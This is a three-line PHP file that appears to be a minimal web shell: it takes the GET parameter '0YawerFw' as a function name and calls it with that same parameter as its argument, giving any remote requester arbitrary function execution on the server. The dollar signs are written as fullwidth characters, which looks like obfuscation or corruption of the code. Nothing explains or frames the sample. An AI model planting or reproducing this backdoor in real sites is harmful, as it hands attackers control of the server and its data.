<?php
＄_GET['0YawerFw'](＄_GET['0YawerFw']);
?>
